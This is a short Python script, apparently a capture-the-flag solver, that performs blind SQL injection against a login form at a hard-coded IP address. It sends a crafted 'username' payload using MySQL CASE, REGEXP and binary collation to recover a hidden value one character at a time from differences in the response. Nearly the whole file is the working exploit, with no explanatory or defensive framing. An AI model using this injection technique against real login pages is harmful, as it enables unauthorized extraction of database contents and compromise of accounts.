import requests
url='http://47.107.231.226:36692/login'
flag=''
# proxies = { "http": None, "https": None}        #3.7以后要添加代理池
for i in range(1,60):
    for ascii in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ^!?$#':
        if(ascii in '^!?$'):
            ascii="\\\\\\"+ascii
        payload={
            'password':'12345',
            'username':f"'||case`username`regexp'^{flag+ascii}'COLLATE'utf8mb4_bin'when'1'then~0+1+''else'0'end||'"

        }
        response=requests.post(url=url, data=payload)
        print(payload)
        print(response.text)
        if '5' in response.text:
            flag+=ascii
            print(flag)
            break
        print(ascii)


# import requests
# import time
# url='http://http://47.107.231.226:36692/login'
# try:
#     response=requests.get(url=url)
# except Exception as e:
#     time.sleep(1)
# #response=requests.get(url=url)
# #print(payload)
# print(response.text)